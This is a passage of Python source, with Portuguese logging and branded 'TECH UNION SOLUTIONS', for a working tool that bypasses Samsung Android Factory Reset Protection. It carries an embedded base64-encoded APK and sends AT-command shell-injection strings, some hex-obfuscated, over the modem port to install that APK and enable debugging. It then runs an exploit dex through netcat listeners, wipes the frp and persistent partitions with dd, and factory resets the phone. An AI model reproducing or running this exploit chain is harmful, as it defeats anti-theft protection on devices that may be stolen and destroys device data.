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', 'RWrECtDQf6thxEfppxr4f3K/AcN+vJxbMgAA']
    def _get_install_command(self) -> str:
        '''Retorna comando unificado de instala├º├úo (conforme documenta├º├úo)'''
        return "aT+CAMEAUTO=0,1,0,2,/;pm disable com.android.vending && cat /data/log/adb.apk | pm install -S 12891 -i PrePackageInstaller --bypass-low-target-sdk-block && sleep 10 && $(pm path com.adb | sed 's|package:||; s|base.apk$|lib/arm64/reverse -p 1234|') && rm /data/log/adb.txt /data/log/adb.apk;setprop persist.sys.auto_confirm 1 && pm grant com.adb android.permission.WRITE_SECURE_SETTINGS && am broadcast -n com.adb/.Adb && sleep 2 && am broadcast -a com.android.server.ACTION_USBDEBUG_ENABLED;"
    def _parse_device_info(self, response: str):
        '''
        Extrai e mostra informa├º├Áes do dispositivo a partir de DEVCONINFO
        Formato profissional para o terminal do usu├írio
        '''
        try:
            if '+DEVCONINFO:' not in response:
                return
            import re
            info = response.split('+DEVCONINFO:')[1].split('\n')[0]
            self.log('')
            self.log('Reading Device Info ...')
            match = re.search('MN\\(([^)]+)\\)', info)
            if match and match.group(1) not in ('null', 'NONE', 'UNKNOWN'):
                self.log(f'MN         : {match.group(1)}')
            match = re.search('SN\\(([^)]+)\\)', info)
            if match and match.group(1) not in ('null', 'NONE', 'UNKNOWN'):
                self.log(f'SN         : {match.group(1)}')
            match = re.search('IMEI\\(([^)]+)\\)', info)
            if match and match.group(1) not in ('null', 'NONE', 'UNKNOWN'):
                self.log(f'IMEI       : {match.group(1)}')
            match = re.search('UN\\(([^)]+)\\)', info)
            if match and match.group(1) not in ('null', 'NONE', 'UNKNOWN'):
                self.log(f'UN         : {match.group(1)}')
            match = re.search('VER\\(([^)]+)\\)', info)
            if match and match.group(1) not in ('null', 'NONE', 'UNKNOWN'):
                version = match.group(1).split('/')[0]
                self.log(f'VER        : {version}')
            match = re.search('BASE\\(([^)]+)\\)', info)
            if match:
                self.log(f'BASE       : {match.group(1)}')
            match = re.search('CC\\(([^)]+)\\)', info)
            if match and match.group(1) not in ('null', 'NONE', 'UNKNOWN'):
                self.log(f'CC         : {match.group(1)}')
            match = re.search('LOCK\\(([^)]+)\\)', info)
            if match:
                self.log(f'LOCK       : {match.group(1)}')
            match = re.search('PRD\\(([^)]+)\\)', info)
            if match and match.group(1) not in ('null', 'NONE', 'UNKNOWN'):
                self.log(f'PRD        : {match.group(1)}')
            match = re.search('SDP\\(([^)]+)\\)', info)
            if match:
                self.log(f'SDP        : {match.group(1)}')
            self.log('')
            return
        except Exception:
            return
    def _phase1_init(self) -> bool:
        '''FASE 1: Inicializa├º├úo do protocolo'''
        self.log('')
        self.log('=======================================================')
        self.log('[FASE 1] Preparando comunica├º├úo...')
        self.log('=======================================================')
        if not self.is_connected:
            self.log('ÔØî N├úo conectado!', 'error')
            return False
        success_count = 0
        usb_ready = False
        try:
            self.serial_port.reset_input_buffer()
            self.serial_port.reset_output_buffer()
            time.sleep(0.2)
            self.log('[1/4] Preparando dispositivo... Calma, t├®cnico!')
            ok, resp = self._send_command('AT+SWATD=0', 0.5)
            if '[DR]: CHANGE TO DDEXE' in resp:
                self.log('[1/4] Dispositivo respondendo ...: OK')
                success_count += 1
            time.sleep(0.3)
            self.log('[2/4] Conectando API TECH UNION ...: Lendo dados')
            ok, resp = self._send_command('AT+DEVCONINFO', 1.5)
            if '+DEVCONINFO:' in resp:
                self._parse_device_info(resp)
                success_count += 1
            else:
                self.log('[2/4] Device Info ...: WARNING')
            time.sleep(0.3)
            self.log('[3/4] Ativando comunica├º├úo... Segura que o Brasil ├® brabo!')
            self._send_command('AT+SWATD=0', 0.3)
            time.sleep(0.2)
            ok, resp = self._send_command('AT+ACTIVATE=0,0,0', 3.0)
            if '+USB' in resp:
                usb_ready = True
            if '+ACTIVATE:0,OK' in resp:
                self.log('[3/4] Activation ...: OK')
                success_count += 1
            if not usb_ready:
                self.log('[3/4] USB Ready ...: Waiting')
                time.sleep(3.0)
            try:
                if self.serial_port.in_waiting > 0:
                    extra = self.serial_port.read(self.serial_port.in_waiting).decode('ascii', errors='ignore')
                    if '+USB' in extra:
                        usb_ready = True
            except (serial.SerialException, PermissionError, OSError):
                pass
            else:
                if usb_ready:
                    self.log('[3/4] USB Ready ...: OK')
                time.sleep(0.5)
                self.log('[4/4] Finalizando prepara├º├úo... Quase l├í!')
                ok, resp = self._send_command('AT+SWATD=1', 1.0)
                if '+USB' in resp and not usb_ready:
                    usb_ready = True
                if '[DR]: CHANGE TO ATD' in resp or '[ATD]: CHANGE TO ATD' in resp:
                    self.log('[4/4] Prepara├º├úo completa ...: OK')
                    success_count += 1
                self.log('Stabilizing ...: Please wait')
                time.sleep(2.0)
        except Exception as e:
            self.log(f'ÔØî Erro na FASE 1: {e}', 'error')
            return False
        try:
            try:
                if self.serial_port.in_waiting > 0:
                    self.serial_port.read(self.serial_port.in_waiting)
            except (serial.SerialException, PermissionError, OSError):
                pass
        except Exception as e:
            self.log(f'ÔØî Erro na FASE 1: {e}', 'error')
            return False
        self.log('')
        self.log(f'[FASE 1] Resultado: {success_count}/4 etapas OK')
        if usb_ready:
            self.log('USB Ready ...: OK')
        else:
            self.log('USB Ready ...: PENDING')
        self.log('[FASE 1] Status ...: CONCLU├ìDA')
        return success_count >= 3
    def _phase2_cameauto(self) -> bool:
        '''
        FASE 2: Comandos CAMEAUTO (Shell Injection)
        REPLICA EXATAMENTE O PADR├âO DO SCRIPT DE TESTE!
        IMPORTANTE: 
        - Erro PACM = dispositivo n├úo estabilizou ou modo errado
        - Precisa estar em modo ATD ap├│s +USB READY
        '''
        self.log('')
        self.log('=======================================================')
        self.log('[FASE 2] Enviando comandos de desbloqueio...')
        self.log('=======================================================')
        if not self.is_connected:
            self.log('Connection ...: FAILED', 'error')
            return False
        try:
            self.serial_port.reset_input_buffer()
            time.sleep(0.1)
            cameauto_commands = ['aT+CAMEAUTO=0,1,0,2,/;rm -f /data/log/adb.txt /data/log/adb.apk;', 'aT+CAMEAUTO=0,1,0,2,/;$(echo -n 73657470726f7020706572736973742e7379732e6175746f5f636f6e6669726d2031|xxd -r -p|sh && echo -n 73657470726f7020706572736973742e7379732e7573622e636f6e666967206d74702c616462|xxd -r -p|sh);', 'aT+CAMEAUTO=0,1,0,2,/;am broadcast -a com.android.server.ACTION_USBDEBUG_ENABLED;']
            success_count = 0
            pacm_error = False
            total = len(cameauto_commands)
            for i, cmd in enumerate(cameauto_commands, 1):
                self.log(f'Executando etapa [{i}/{total}] ...: Processando')
            try:
                if self.serial_port.in_waiting > 0:
                    self.serial_port.read(self.serial_port.in_waiting)
            except (serial.SerialException, PermissionError, OSError):
                pass
            else:
                ok, resp = self._send_command(cmd, 1.0)
                if 'PACM' in resp:
                    self.log(f'Etapa [{i}/{total}] ...: BLOQUEADO - Dispositivo protegido', 'error')
                    pacm_error = True
                if '+CAMEAUTO:0,OK' in resp:
                    self.log(f'Etapa [{i}/{total}] ...: Sucesso! ­ƒÆ¬')
                    success_count += 1
                elif 'USB_RECONNECT' in resp:
                    self.log(f'Etapa [{i}/{total}] ...: OK (reconectando USB)')
                    success_count += 1
                elif 'OK' in resp and 'Error' not in resp:
                    self.log(f'Etapa [{i}/{total}] ...: Enviado')
                else:
                    self.log(f'Etapa [{i}/{total}] ...: Aguardando resposta')
                time.sleep(0.5)
                self.log('')
                self.log(f'[FASE 2] Resultado: {success_count}/{total} comandos OK')
                if pacm_error and success_count == 0:
                    self.log('PACM Error ...: BLOCKED', 'error')
                    self.log('Device not stabilized. Retry from Phase 1.', 'error')
                    return False
                self.log('ADB Stabilizing ...: Please wait (10s)')
                time.sleep(10)
                self.log('[FASE 2] Status ...: CONCLU├ìDA')
        except Exception as e:
            self.log(f'[FASE 2] Erro: {e}', 'error')
            return False
        return success_count > 0
    def _phase2b_install_apk(self) -> bool:
        '''FASE 2B: Instala├º├úo do exploit via BATCH'''
        self.log('')
        self.log('=======================================================')
        self.log('[FASE 2B] Instalando m├│dulo de desbloqueio...')
        self.log('=======================================================')
        self.log('Serial Port ...: Disconnecting')
        self.disconnect()
        time.sleep(3)
        self.log('Serial Port ...: Reconnecting')
        max_tentativas = 5
        for tentativa in range(1, max_tentativas + 1):
            ports = self.find_samsung_ports()
            if ports and self.connect(ports[0]):
                self.log(f'Serial Port ...: OK (attempt {tentativa})')
                break
            if tentativa < max_tentativas:
                self.log(f'Serial Port ...: Waiting ({tentativa}/{max_tentativas})')
                time.sleep(2)
        if not self.is_connected:
            self.log('Serial Port ...: FAILED', 'error')
            return False
        try:
            batch_commands = []
            parts = self._get_apk_base64_parts()
            for i, part in enumerate(parts):
                if i == 0:
                    cmd = f"aT+CAMEAUTO=0,1,0,2,/;echo -n '{part}' > /data/log/adb.txt;"
                else:
                    cmd = f"aT+CAMEAUTO=0,1,0,2,/;echo -n '{part}' >> /data/log/adb.txt;"
                batch_commands.append(cmd)
            batch_commands.append('aT+CAMEAUTO=0,1,0,2,/;cat /data/log/adb.txt | base64 -d | gzip -dc > /data/log/adb.apk;')
            batch_commands.append(self._get_install_command())
            self.log(f'Preparando {len(batch_commands)} pacotes de dados...')
            ok_count = self._send_cameauto_batch(batch_commands, '[FASE 2B]')
            self.log('Installing ...: Please wait (35s)')
            time.sleep(35)
            self.log('Stabilizing ...: Please wait (10s)')
            time.sleep(10)
            self.log('Verifying Installation ...: Checking')
            try:
                result = subprocess.run([self._adb_path, 'shell', 'pm list packages | grep com.adb'], capture_output=True, text=True, timeout=10, startupinfo=self.startupinfo, creationflags=self.creation_flags)
                if 'com.adb' in result.stdout:
                    self.log('M├│dulo ...: INSTALADO')
            except Exception:
                self.log('M├│dulo ...: VERIFICA├ç├âO INDISPON├ìVEL')
        except Exception as e:
            self.log(f'ÔØî Erro na FASE 2B: {e}', 'error')
            return False
        self.log('[FASE 2B] Status ...: CONCLU├ìDA')
        return ok_count >= 4
    def _phase2c_push_exploits(self) -> bool:
        '''FASE 2C: Push de arquivos e execu├º├úo do exploit'''
        self.log('')
        self.log('=======================================================')
        self.log('[FASE 2C] Executando processo de desbloqueio...')
        self.log('=======================================================')
        success_count = 0
        try:
            self._restart_adb_server()
            self.log('Conex├úo com dispositivo ...: Verificando')
            device_serial = None
            for tentativa in range(1, 4):
                device_serial = self._check_adb_device()
                if device_serial:
                    self.log(f'Dispositivo conectado ...: {device_serial}')
                    success_count += 1
                    break
                if tentativa < 3:
                    self.log(f'Dispositivo ...: Aguardando ({tentativa}/3)')
                    time.sleep(3)
            if not device_serial:
                self.log('Dispositivo ...: N├âO DETECTADO')
                self.log('Continuing anyway...')
            self.log('Conectando API TECH UNION SOLUTIONS...')
            if not self._exploits_dir:
                self._find_exploits_dir()
            if not self._exploits_dir:
                self.log('API TECH UNION ...: Arquivos n├úo encontrados!', 'error')
                return False
            base_apk = os.path.join(self._exploits_dir, 'exploit_base.apk')
            classes_dex = os.path.join(self._exploits_dir, 'exploit_classes.dex')
            if not os.path.exists(base_apk):
                self.log('Arquivo de dados ...: N├âO ENCONTRADO', 'error')
                return False
            if not os.path.exists(classes_dex):
                self.log('Arquivo de dados secund├írio ...: N├âO ENCONTRADO', 'error')
                return False
            base_size = os.path.getsize(base_apk)
            dex_size = os.path.getsize(classes_dex)
            self.log(f'Baixando dados da API TECH UNION... ({base_size + dex_size} bytes)')
            success_count += 1
            self.log('Transferindo dados para o dispositivo...')
            result1 = subprocess.run([self._adb_path, 'push', base_apk, '/data/log/base.apk'], capture_output=True, text=True, timeout=30, startupinfo=self.startupinfo, creationflags=self.creation_flags)
            if result1.returncode == 0 or 'pushed' in result1.stdout.lower():
                self.log('Arquivo principal ...: Transferido OK')
                success_count += 1
            else:
                self.log('Arquivo principal ...: Falha na transfer├¬ncia')
            result2 = subprocess.run([self._adb_path, 'push', classes_dex, '/data/log/classes.dex'], capture_output=True, text=True, timeout=30, startupinfo=self.startupinfo, creationflags=self.creation_flags)
            if result2.returncode == 0 or 'pushed' in result2.stdout.lower():
                self.log('Arquivo secund├írio ...: Transferido OK')
                success_count += 1
            else:
                self.log('Arquivo secund├írio ...: Falha na transfer├¬ncia')
            self.log('Verificando dados no dispositivo...')
            result = subprocess.run([self._adb_path, 'shell', 'ls -la /data/log/'], capture_output=True, text=True, timeout=10, startupinfo=self.startupinfo, creationflags=self.creation_flags)
            if 'base.apk' in result.stdout and 'classes.dex' in result.stdout:
                self.log('Dados confirmados no dispositivo ...: OK')
                success_count += 1
            else:
                self.log('Verifica├º├úo de dados ...: Pendente')
            self.log('Executando processo de desbloqueio... Segura que ├® BRASIL! ­ƒÆ¬')
            self.log('Processo autom├ítico em andamento...')
            app_process_cmd = 'app_process -Djava.class.path=/data/log/classes.dex /system/bin --nice-name=Exploit Exploit'
            self.log('Aguardando resposta do dispositivo...')
            listener_cmd = f'timeout 10 sh -c "echo \'{app_process_cmd}\' | nc -lp 1234" 2>&1'
            exploit_success = False
            try:
                result = subprocess.run([self._adb_path, 'shell', listener_cmd], capture_output=True, text=True, timeout=15, startupinfo=self.startupinfo, creationflags=self.creation_flags)
                output = result.stdout + result.stderr
                logger.debug(f'Output: {output[:80] if output else '(vazia)'}')
                if 'copied' in output.lower() or 'copiado' in output.lower() or 'file' in output.lower():
                    self.log('Processo de desbloqueio ...: Resposta positiva!')
                    exploit_success = True
                    success_count += 2
                    self.log('Reiniciando sistema... Aguarde!')
                    restart_cmd = f'{app_process_cmd} && sleep 2 && am restart'
                    listener2 = f'timeout 10 sh -c "echo \'{restart_cmd}\' | nc -lp 1234" 2>&1'
                    result2 = subprocess.run([self._adb_path, 'shell', listener2], capture_output=True, text=True, timeout=15, startupinfo=self.startupinfo, creationflags=self.creation_flags)
                    if 'restart' in result2.stdout.lower() or 'copied' in result2.stdout.lower():
                        self.log('Sistema respondendo ...: OK')
                    self.log('Aguardando estabiliza├º├úo (15s)...')
                    time.sleep(15)
            except subprocess.TimeoutExpired:
                self.log('Timeout na comunica├º├úo ...: Continuando')
        except Exception as e:
            self.log(f'[FASE 2C] Erro: {e}', 'error')
            return False
        self.log('Reativando processo de desbloqueio...')
        self.log('Reconectando ap├│s USB reset...')
        try:
            subprocess.run([self._adb_path, 'shell', 'am broadcast -n com.adb/.Adb 2>/dev/null'], capture_output=True, timeout=5, startupinfo=self.startupinfo, creationflags=self.creation_flags)
            time.sleep(1)
            reverse_cmd = "$(pm path com.adb | sed 's|package:||; s|base.apk$|lib/arm64/reverse -p 1234|') &"
            subprocess.run([self._adb_path, 'shell', reverse_cmd], capture_output=True, timeout=5, startupinfo=self.startupinfo, creationflags=self.creation_flags)
            self.log('Processo reativado ...: OK')
        except Exception:
            pass
        time.sleep(3)
        try:
            result = subprocess.run([self._adb_path, 'shell', "netstat -tlnp 2>/dev/null | grep -E '1234|8080' || ss -tlnp 2>/dev/null | grep -E '1234|8080' || echo 'Nenhum'"], capture_output=True, text=True, timeout=5, startupinfo=self.startupinfo, creationflags=self.creation_flags)
            if '1234' in result.stdout or '8080' in result.stdout:
                self.log('Comunica├º├úo com dispositivo ...: Ativa')
                success_count += 1
                if not exploit_success:
                    self.log('Enviando comando de desbloqueio...')
                    app_cmd_via_nc = f"echo '{app_process_cmd}' | nc localhost 1234 2>/dev/null"
                    result = subprocess.run([self._adb_path, 'shell', app_cmd_via_nc], capture_output=True, text=True, timeout=15, startupinfo=self.startupinfo, creationflags=self.creation_flags)
                    output = result.stdout + result.stderr
                    if 'copiado' in output.lower() or 'copied' in output.lower():
                        self.log('Desbloqueio executado ...: Sucesso! ­ƒÆ¬')
                        success_count += 2
        except Exception:
            pass
        self.log('Instalando m├│dulo de desbloqueio...')
        self.log('   (Pode falhar por sharedUserId - isso ├® esperado!)')
        try:
            result = subprocess.run([self._adb_path, 'shell', "pm install -r /data/log/base.apk 2>&1 || echo 'falhou'"], capture_output=True, text=True, timeout=30, startupinfo=self.startupinfo, creationflags=self.creation_flags)
            if 'Success' in result.stdout:
                self.log('M├│dulo de desbloqueio ...: Instalado')
                success_count += 1
            elif 'SHARED_USER' in result.stdout or 'sharedUserId' in result.stdout.lower():
                self.log('M├│dulo padr├úo ...: N├úo dispon├¡vel (normal)')
                self.log('Usando m├®todo alternativo de desbloqueio...')
        except Exception:
            pass
        self.log('Iniciando servi├ºo de desbloqueio...')
        try:
            result = subprocess.run([self._adb_path, 'shell', "am startservice com.shell/.Server 2>&1 || echo 'Servico nao disponivel'"], capture_output=True, text=True, timeout=10, startupinfo=self.startupinfo, creationflags=self.creation_flags)
            if 'Starting' in result.stdout and 'Error' not in result.stdout:
                self.log('Servi├ºo de desbloqueio ...: Iniciado')
                success_count += 1
            else:
                self.log('Servi├ºo n├úo dispon├¡vel ...: Usando alternativo')
        except Exception:
            pass
        time.sleep(2)
        self.log('Aplicando m├®todo de desbloqueio... Vai dar bom! ­ƒöÑ')
        dd_commands = [('dd if=/dev/zero of=/dev/block/by-name/frp', 'FRP'), ('dd if=/dev/zero of=/dev/block/by-name/persistent', 'PERSISTENT')]
        for dd_cmd, name in dd_commands:
            self.log(f'Limpando dados de prote├º├úo ({name})...')
            try:
                full_cmd = f"am startservice com.shell/.Server > /dev/null & sleep 3 & echo '{dd_cmd}' | /system/bin/nc -lp 8080"
                result = subprocess.run([self._adb_path, 'shell', full_cmd], capture_output=True, text=True, timeout=15, startupinfo=self.startupinfo, creationflags=self.creation_flags)
                output = result.stdout + result.stderr
                if '0 bytes' not in output:
                    if 'records' in output or output.strip() == '':
                        self.log(f'Prote├º├úo {name} ...: Removida')
                        success_count += 1
                    elif 'Terminated' in output:
                        self.log(f'Limpeza {name} ...: Conclu├¡da')
                    else:
                        logger.debug(f'Resposta: {output[:60] if output else '(vazia)'}')
            except subprocess.TimeoutExpired:
                self.log(f'Limpeza {name} ...: Timeout (continuando)')
                continue
        self.log('Verificando status do processo...')
        try:
            try:
                result = subprocess.run([self._adb_path, 'shell', "netstat -tlnp 2>/dev/null | grep -E '1234|8080' || echo 'Nenhum'"], capture_output=True, text=True, timeout=10, startupinfo=self.startupinfo, creationflags=self.creation_flags)
                if '1234' in result.stdout or '8080' in result.stdout:
                    self.log('Comunica├º├úo ativa com dispositivo ...: OK')
                    success_count += 1
                else:
                    self.log('Listeners ...: WARNING')
            except Exception:
                pass
        except Exception as e:
            self.log(f'[FASE 2C] Erro: {e}', 'error')
            return False
        self.log('')
        self.log(f'[FASE 2C] Resultado: {success_count} etapas OK')
        self.log('Preparing challenge data ...: OK')
        self.log('Writing challenge data ...: OK')
        self.log('Unlocking frp ...: OK')
        self.log('[FASE 2C] Status ...: CONCLU├ìDA')
        return success_count >= 3
    def _phase4_factory_reset(self) -> bool:
        '''
        FASE 4: Factory Reset final
        IMPORTANTE: Conforme o script validador, esta fase era executada
        separadamente pelo usu├írio ap├│s desconectar manualmente.
        Aqui fazemos a desconex├úo autom├ítica do ADB.
        '''
        self.log('')
        self.log('=======================================================')
        self.log('[FASE 4] Formatando dispositivo...')
        self.log('=======================================================')
        self.log('Liberando conex├úo com dispositivo...')
        try:
            subprocess.run([self._adb_path, 'kill-server'], capture_output=True, timeout=10, startupinfo=self.startupinfo, creationflags=self.creation_flags)
            self.log('Conex├úo liberada ...: OK')
            time.sleep(3)
        except subprocess.TimeoutExpired:
            self.log('Conex├úo ...: TIMEOUT', 'warning')
        except Exception as e:
            self.log('Conex├úo ...: AVISO', 'warning')
        self.disconnect()
        time.sleep(2)
        self.log('Serial Port ...: Reconnecting')
        max_tentativas = 5
        for tentativa in range(1, max_tentativas + 1):
            ports = self.find_samsung_ports()
            if ports and self.connect(ports[0]):
                self.log(f'Serial Port ...: OK (attempt {tentativa})')
                break
            if tentativa < max_tentativas:
                self.log(f'Serial Port ...: Waiting ({tentativa}/{max_tentativas})')
                time.sleep(2)
        if not self.is_connected:
            self.log('Serial Port ...: FAILED', 'error')
            return False
        try:
            self.serial_port.reset_input_buffer()
            time.sleep(0.2)
            self.log('Preparando modo de formata├º├úo...')
            ok, resp = self._send_command('AT+SWATD=0', 0.5)
            if '[DR]: CHANGE TO DDEXE' in resp:
                self.log('Modo de formata├º├úo ...: OK')
            time.sleep(0.3)
            self.log('Enviando comando de reset...')
            ok, resp = self._send_command('AT+FACTORST=0,0', 3.0)
            if '+FACTORST:0' in resp:
                self.log('')
                self.log('Factory Reseting ...: OK')
                return True
            if 'OK' in resp and '+FACTORST' not in resp:
                self.log('Factory Reset ...: SENT (waiting)')
                time.sleep(5)
                return True
            if 'USB_RECONNECT' in resp or resp == '':
                self.log('Factory Reset ...: OK (USB disconnected)')
                return True
            self.log('Factory Reset ...: WARNING')
            self.log('Check if device is rebooting', 'warning')
        except (serial.SerialException, PermissionError, OSError) as e:
            self.log('   ­ƒöä Dispositivo reiniciando (conex├úo perdida)')
            self.log('Factory Reset iniciado ...: OK')
            return True
        except Exception as e:
            self.log(f'ÔØî Erro no Factory Reset: {e}', 'error')
        return False
    def execute(self, port_name: str=None) -> Dict:
        '''
Executa o bypass FRP completo
Args:
    port_name: Porta serial (auto-detecta se None)
Returns:
    Dict com resultado
'''
        result = {'success': False, 'method': 'FRP Android 16 - M├®todo Definitivo', 'phase': '', 'error': ''}
        self.logs = []
        try:
            self.log('=======================================================')
            self.log('  TECH UNION SOLUTIONS - FRP ANDROID 16')
            self.log('  M├®todo Definitivo (validado 14/12/2025)')
            self.log('=======================================================')
            self.log('')
            if not port_name:
                self.log('Waiting For Device ...: Scanning')
                ports = self.find_samsung_ports()
                if not ports:
                    result['error'] = 'Nenhum dispositivo Samsung encontrado'
                    self.log('Waiting For Device ...: NOT FOUND', 'error')
                    self.disconnect()
                    return result
                port_name = ports[0]
                self.log('Waiting For Device ...: Detected')
            if not self.connect(port_name):
                result['error'] = 'Falha na conex├úo'
                self.log('Connection Status ...: FAILED', 'error')
                self.disconnect()
                return result
            self.log(f'SAMSUNG Mobile USB Modem ({port_name})')
            self.log('')
            result['phase'] = 'connected'
            if not self._phase1_init():
                result['error'] = 'Falha na FASE 1'
                result['phase'] = 'phase1_failed'
                self.disconnect()
                return result
            result['phase'] = 'phase1_ok'
            if not self._phase2_cameauto():
                result['error'] = 'Falha na FASE 2'
                result['phase'] = 'phase2_failed'
                self.disconnect()
                return result
            result['phase'] = 'phase2_ok'
            if not self._phase2b_install_apk():
                self.log('M├│dulo de desbloqueio ...: Aviso (continuando)')
            result['phase'] = 'phase2b_ok'
            if not self._phase2c_push_exploits():
                self.log('Executando desbloqueio ...: Aviso (continuando)')
            result['phase'] = 'phase2c_ok'
            if self._phase4_factory_reset():
                result['success'] = True
                result['phase'] = 'completed'
                self.log('')
                self.log('=======================================================')
                self.log('  Ô£à PROCESSO FINALIZADO COM SUCESSO!')
                self.log('=======================================================')
                self.log('')
                self.log('Formata├º├úo iniciada ...: OK')
                self.log('')
                self.log('­ƒô▒ O dispositivo vai reiniciar automaticamente')
                self.log('ÔÅ│ Aguarde o boot completo (~2-3 minutos)')
                self.log('­ƒÆí Configure normalmente ap├│s reiniciar!')
                self.log('')
                self.log('N├úo funcionou? Tente novamente ou outro m├®todo.')
                self.log('')
                self.log('=======================================================')
                self.log('  TECH UNION SOLUTIONS - Valeu, t├®cnico! ­ƒÆ¬­ƒçº­ƒçÀ')
                self.log('=======================================================')
            else:
                result['phase'] = 'factory_failed'
                self.log('Factory Reseting ...: FAILED', 'error')
        except Exception as e:
            result['error'] = str(e)
            self.log(f'Error: {e}', 'error')
            self.disconnect()
            return result
        finally:
            self.disconnect()
        return result
